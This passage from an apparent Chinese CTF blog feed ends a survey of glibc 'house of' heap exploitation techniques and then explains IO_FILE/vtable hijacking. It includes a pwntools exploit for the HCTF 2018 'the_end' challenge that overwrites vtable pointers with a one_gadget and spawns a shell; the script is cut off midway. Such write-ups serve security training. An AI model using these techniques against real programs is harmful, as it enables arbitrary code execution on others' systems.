class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>仅仅借助 <code>unsortedbin</code> 链就能控制 <code>main_arena</code> 的 <code>next</code> 和 <code>system_mem</code></li><li>利用 <code>binmap</code> 的值构造出合法的 <code>size</code></li></ul><h3 id="利用效果-26"><a href="#利用效果-26" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>劫持 <code>thread_arena</code> 为 <code>fake_arena</code></li></ul><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3 - 总结"></a>3 - 总结</h1><ul><li>总结了 <code>28</code> 种 <code>house of</code> 系列利用手法</li><li>给出了每种利用手法的影响版本、适用范围、利用原理等</li><li>所有的利用方法都可以在源码中找到答案，因此强烈建议将源码反复阅读</li><li>可以根据目前已有的技术提出新的组合技</li></ul><h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4 - 参考"></a>4 - 参考</h1><p>[1] <a href="https://www.anquanke.com/post/id/244158">堆利用系列之 house of spirit - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[2] <a href="https://github.com/shellphish/how2heap">shellphish/how2heap: A repository for learning various heap exploitation techniques. (github.com)</a></p><p>[3] <a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></p><p>[4] [<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h2_1">原创] CTF 中 glibc 堆利用 及 IO_FILE 总结 - Pwn - 看雪论坛 - 安全社区 | 安全招聘 | bbs.pediy.com (kanxue.com)</a></p><p>[5] <a href="https://www.anquanke.com/post/id/251596">PWN——House Of Einherjar CTF Wiki 例题详解 - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[6] <a href="https://www.anquanke.com/post/id/175630">Top chunk 劫持：House of force 攻击 - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[7] <a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/">House of Lore - CTF Wiki (ctf-wiki.org)</a></p><p>[8] <a href="https://www.anquanke.com/post/id/218887">House of orange - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[9] <a href="http://p4nda.top/2018/04/18/house-of-rabbit/">house of rabbit</a></p><p>[10] <a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-roman/">House of Roman - CTF Wiki (ctf-wiki.org)</a></p><p>[11] <a href="https://www.anquanke.com/post/id/203096">House of storm 原理及利用 - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[12] <a href="https://xz.aliyun.com/t/6862#toc-5">House-of-Corrosion 一种新的堆利用技巧 - 先知社区 (aliyun.com)</a></p><p>[13] <a href="https://www.anquanke.com/post/id/202387">house-of-husk 学习笔记 - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[14] <a href="https://www.anquanke.com/post/id/254797">House of Muney 分析 - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[15] <a href="https://forum.butian.net/share/1709">奇安信攻防社区 - 深入理解 House of Botcake 堆利用手法 (butian.net)</a></p><p>[16] <a href="https://github.com/c4ebt/House-of-Rust">c4ebt/House-of-Rust: The House of Rust is a heap exploitation technique that drops a shell against full PIE binaries that don’t leak any addresses. (github.com)</a></p><p>[17] <a href="https://www.anquanke.com/post/id/222948">house of banana - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[18] <a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[19] <a href="https://www.anquanke.com/post/id/260614">house of emma</a></p><p>[20] <a href="https://www.anquanke.com/post/id/242640">house of pig 一个新的堆利用详解 - 安全客 - 安全资讯平台 (anquanke.com)</a></p><p>[21] <a href="https://tttang.com/archive/1845/">一条新的 glibc IO_FILE 利用链：_IO_obstack_jumps 利用分析 - 跳跳糖 (tttang.com)</a></p><p>[22] <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple 一种新的 glibc 中 IO 攻击方法 (1) - roderick - record and learn! (roderickchan.cn)</a></p><p>[23] <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的 glibc 中 IO 攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</a></p><p>[24] <a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/">House of Apple 一种新的 glibc 中 IO 攻击方法 (3) - roderick - record and learn! (roderickchan.cn)</a></p><p>[25] <a href="https://www.roderickchan.cn/2022-06-18-glibcheap-house-of-muney/">GlibcHeap-house of muney - roderick - record and learn! (roderickchan.cn)</a></p><p>[26] <a href="https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT">house-of-gods/HOUSE_OF_GODS.TXT at master · Milo-D/house-of-gods (github.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;转载自&lt;a href=&quot;https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#1-%E5%89%8D%E8%A8%80&quot;&gt;Glibc堆利用之house</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>IO_File的利用</title>
    <link href="https://kylinxin.github.io/2023/11/21/IO_File%E5%88%A9%E7%94%A8/"/>
    <id>https://kylinxin.github.io/2023/11/21/IO_File%E5%88%A9%E7%94%A8/</id>
    <published>2023-11-21T15:14:29.000Z</published>
    <updated>2023-11-21T15:02:22.826Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【PWN】IO-FILE的利用"><a href="#【PWN】IO-FILE的利用" class="headerlink" title="【PWN】IO_FILE的利用"></a>【PWN】IO_FILE的利用</h1><p>此篇简单的学习一下IO_File的利用</p><h2 id="IO-FILE-的结构"><a href="#IO-FILE-的结构" class="headerlink" title="IO_FILE 的结构"></a>IO_FILE 的结构</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> {</span><br>  <span class="hljs-type">int</span> _flags;       <span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br> <br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;   <span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;   <span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;  <span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base; <span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;  <span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;  <span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;   <span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;    <span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it's too small.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>};<br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">{</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don't get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>};<br></code></pre></td></tr></tbody></table></figure><p> IO_FILE实际上还包括在一个IO_FILE_plus中</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">{</span><br>    _IO_FILE    file;<br>    IO_jump_t   *vtable;<br>}<br></code></pre></td></tr></tbody></table></figure><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8 </p><p>IO_FILE_plus结构通过链表链接</p><pre><code>    初始时形成以下顺序：    _IO_list_all  -&gt; _IO_2_1_stderr_ -&gt;  _IO_2_1_stdout_  -&gt;  _IO_2_1_stdin_</code></pre><p>_IO_list_all 是一个链表头</p><p>后面三个文件是三个自动open的文件，它们的文件描述符为2，1，0</p><p>stdin对应0，所以我们也可以猜想平常写的read(0,xxx,xxx)与write(1,xxx,xxx)是何含义，我们的io输入输出被抽象成了文件输入输出</p><p>假设我们open file，其会被插入到链表头位置，类似我们之前学的fastbin 插入。</p><p>它们会存在哪里？</p><p>自动开启的三个文件结构（IO_FILE_plus)会被存放在libc中，后续手动开启的则会被分配在堆区。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:00000000003C56F8                 dq offset _IO_file_jumps  // vtables<br>.data:00000000003C5700                 public stderr<br>.data:00000000003C5700 stderr          dq offset _IO_2_1_stderr_<br>.data:00000000003C5700                                         ; DATA XREF: LOAD:000000000000BAF0↑o<br>.data:00000000003C5700                                         ; fclose+F2↑r ...<br>.data:00000000003C5708                 public stdout<br>.data:00000000003C5708 stdout          dq offset _IO_2_1_stdout_<br>.data:00000000003C5708                                         ; DATA XREF: LOAD:0000000000009F48↑o<br>.data:00000000003C5708                                         ; fclose+E9↑r ...<br>.data:00000000003C5710                 public stdin<br>.data:00000000003C5710 stdin           dq offset _IO_2_1_stdin_<br>.data:00000000003C5710                                         ; DATA XREF: LOAD:0000000000006DF8↑o<br>.data:00000000003C5710                                         ; fclose:loc_6D340↑r ...<br>.data:00000000003C5718                 dq offset sub_20B70<br>.data:00000000003C5718 _data           ends<br>.data:00000000003C5718<br>.bss:00000000003C5720 ; ===========================================================================<br></code></pre></td></tr></tbody></table></figure><p>那么什么是 *vtable项呢？</p><p>*vtable是一个指针，指向一个虚表。该虚表中存放了</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * funcs[] = {<br>   <span class="hljs-number">1</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// "extra word"</span><br>   <span class="hljs-number">2</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// DUMMY</span><br>   <span class="hljs-number">3</span> <span class="hljs-built_in">exit</span>, <span class="hljs-comment">// finish</span><br>   <span class="hljs-number">4</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// overflow</span><br>   <span class="hljs-number">5</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// underflow</span><br>   <span class="hljs-number">6</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// uflow</span><br>   <span class="hljs-number">7</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// pbackfail</span><br>   <br>   <span class="hljs-number">8</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsputn  #printf后面讲解执行流程章节会用到此处</span><br>   <span class="hljs-number">9</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// xsgetn</span><br>   <span class="hljs-number">10</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekoff</span><br>   <span class="hljs-number">11</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seekpos</span><br>   <span class="hljs-number">12</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// setbuf</span><br>   <span class="hljs-number">13</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// sync</span><br>   <span class="hljs-number">14</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// doallocate</span><br>   <span class="hljs-number">15</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// read</span><br>   <span class="hljs-number">16</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// write</span><br>   <span class="hljs-number">17</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// seek</span><br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-comment">// close</span><br>   <span class="hljs-number">19</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// stat</span><br>   <span class="hljs-number">20</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// showmanyc</span><br>   <span class="hljs-number">21</span> <span class="hljs-literal">NULL</span>, <span class="hljs-comment">// imbue</span><br>};<br></code></pre></td></tr></tbody></table></figure><p>我们还是随便打开一个程序，dbg看看它的示例吧</p><p class='item-img' data-src='https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png'><img src="https://s2.loli.net/2023/11/21/yeVKhRA5TBn9Xk4.png" alt="image.png"></p><p>通过 p _IO_list_all 我们可以查看该符号的地址</p><blockquote><p>p  *(struct _IO_FILE_plus *) _IO_list_all</p></blockquote><p class='item-img' data-src='https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png'><img src="https://s2.loli.net/2023/11/21/tDb3WKnBf4Hy91g.png" alt="image.png"></p><p>我们这里可以看到vtable项、fileno项与_chain项</p><p>_chain项指向下一个表，如stderr的chain的值就是stdout的地址，fileno存的就是该文件的文件描述符。</p><p>那么这个虚表是干什么的？</p><blockquote><p>_IO_puts在过程当中调用了一个叫做<code>_IO_sputn</code>函数（_IO_fwrite也会调用这个），_IO_sputn其实是一个<code>宏</code>，它的作用就是调用<code>_IO_2_1_stdout_</code>中的<code>vtable</code>所指向的<code>_xsputn</code>，也就是<code>_IO_new_file_xsputn</code>函数</p></blockquote><p>这个虚表存放在哪里？</p><p>这个虚表也存放在了data区，还记得上面有张图吧，其就在stderr的上面。</p><p> 日常所用的输入输出函数会调用虚表中的函数</p><blockquote><p>fread-&gt;_IO_XSGETN<br>fwrite-&gt;_IO_XSPUTN<br>fopen-&gt;malloc a new file struct-&gt;make file vtable-&gt;initialization file struct-&gt;puts initialzation file in file struct<br>fclose -&gt;_IO_unlink_it-&gt;_IO_file_close_it-&gt;_IO_file_finish(_IO_FINISH)</p></blockquote><p>如puts会调用虚表中的_xsputn，而经过一系列操作，最终会系统调用write。</p><h2 id="利用-IO-2-1-stdout泄露libc"><a href="#利用-IO-2-1-stdout泄露libc" class="headerlink" title="利用_IO_2_1_stdout泄露libc"></a>利用_IO_2_1_stdout泄露libc</h2><p> iofile的相关利用，有一个很重要的效果就是泄露libc。</p><p>设置flag位绕过检测</p><blockquote><p>_flags = 0xFBAD1800</p></blockquote><p>伪造 vtable 劫持程序流程<br>由于我们调用io函数时，其最终会指向vtable的函数。所以我们可以通过改变vtable对应项或改变vtable指针，使其指向可利用位置，再在相应位置填写目标函数。</p><p>在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。换言之，2.23及以后，只能通过修改vtable指针再进行利用了。</p><p><strong>举例2018 HCTF the_end</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png'><img src="https://s2.loli.net/2023/11/21/aLy6HXt5ogBscfF.png" alt="image.png"></p><p>由于<a href="https://so.csdn.net/so/search?q=sleep%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">sleep函数</a>地址泄露，所以可以获得基址，于是得到偏移后虚表指针地址，one_gadget地址。</p><p>题目拥有5字节任意地址修改能力。</p><p>本题我们利用的是：</p><ul><li>在程序调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</li></ul><p>setbuf在虚表0x58偏移处。</p><p>所以我们覆盖虚表指针的数值为 伪造处地址-0x58</p><p>exp：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">"debug"</span>,arch = <span class="hljs-string">"amd64"</span>)<br>filename=<span class="hljs-string">'./the_end.the_end'</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>    <span class="hljs-keyword">global</span> p,elf,libc<br>    local = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> local:<br>        p = process([<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so'</span>, filename], env={<span class="hljs-string">"LD_PRELOAD"</span>:<span class="hljs-string">'/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'</span>})<br>        <span class="hljs-comment"># p = process(filename)</span><br>    <span class="hljs-keyword">else</span>:<br>        p = remote(<span class="hljs-string">"node4.buuoj.cn"</span>, <span class="hljs-number">25550</span>)<br>    elf = ELF(filename)<br>    <span class="hljs-comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/hgfs/PWN/study_path/pwn_rm/pwn145_180/libc/64bit/libc-2.23.so")</span><br>    <span class="hljs-comment"># libc = ELF("/mnt/e/CTF/PWN/varctf/buuctf/exer/4/libc-2.27.so")</span><br>    libc = ELF(<span class="hljs-string">"/mnt/e/CTF/PWN/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"</span>)<br><br>s       = <span class="hljs-keyword">lambda</span> data               :p.send(data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sa      = <span class="hljs-keyword">lambda</span> x,data             :p.sendafter(x, data)<br>sla     = <span class="hljs-keyword">lambda</span> x,data             :p.sendlineafter(x, data)<br>r       = <span class="hljs-keyword">lambda</span> n                  :p.recv(n)<br>rl      = <span class="hljs-keyword">lambda</span> n                  :p.recvline(n)<br>ru      = <span class="hljs-keyword">lambda</span> x                  :p.recvuntil(x, drop=<span class="hljs-literal">True</span>)<br>r       = <span class="hljs-keyword">lambda</span> x                  :p.recv(x)<br>uu64    = <span class="hljs-keyword">lambda</span>                    :u64(p.recvuntil(<span class="hljs-string">b'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>itr     = <span class="hljs-keyword">lambda</span>                    :p.interactive()<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg      = <span class="hljs-keyword">lambda</span> address,data       :log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">addr</span>):<br>    gdb.attach(sh,<span class="hljs-string">'b *0x{}\nc\n'</span>.<span class="hljs-built_in">format</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">addr1,byte</span>):<br>    s(p64(addr1))<br>    s(p8(byte))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    ru(<span class="hljs-string">"here is a gift "</span>)<br>    sleep = <span class="hljs-built_in">int</span>(ru(<span class="hljs-string">", "</span>),<span class="hljs-number">16</span>)<br>    leak(<span class="hljs-string">"sleep"</span>,sleep)<br>    libc_addr = sleep - libc.sym[<span class="hljs-string">"sleep"</span>]<br>    lg(<span class="hljs-string">"libc_base"</span>,libc_addr)<br><br>    one_gadget = libc_addr + <span class="hljs-number">0xf1247</span><br>    stdout_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stdout_'</span>]+<span class="hljs-number">0xd8</span><br>    stderr_vtable_ptr = libc_addr + libc.sym[<span class="hljs-string">'_IO_2_1_stderr_'</span>]+<span class="hljs-number">0xd8</span><br>    lg(<span class="hljs-string">"one_gadget"</span>,one_gadget)<br>    lg(<span class="hljs-string">"stdout_vtable_ptr"</span>,stdout_vtable_ptr)<br>    lg(<span class="hljs-string">"stderr_vtable_ptr"</span>,stderr_vtable_ptr)<br><br>    fake_vtable_addr = stderr_vtable_ptr - <span class="hljs-number">0x58</span> <span class="hljs-comment"># fake虚表的位置</span><br>    lg(<span class="hljs-string">"fake_vtable_addr"</span>,fake_vtable_addr)<br>    change(stdout_vtable_ptr,(fake_vtable_addr &amp; <span class="hljs-number">0xff</span>))<br>    change(stdout_vtable_ptr+<span class="hljs-number">1</span>,((fake_vtable_addr &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>)) <span class="hljs-comment">#劫持stdout结构体的虚表指针指向fake table的位置(_IO_2_1_stderr_+128)</span><br><br>    change(stderr_vtable_ptr,(one_gadget &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">1</span>,((one_gadget &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>))<br>    change(stderr_vtable_ptr+<span class="hljs-number">2</span>,((one_gadget &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>))<br><br>    sl(<span class="hljs-string">"exec /bin/sh 1&gt;&amp;0"</span>)<br><br>    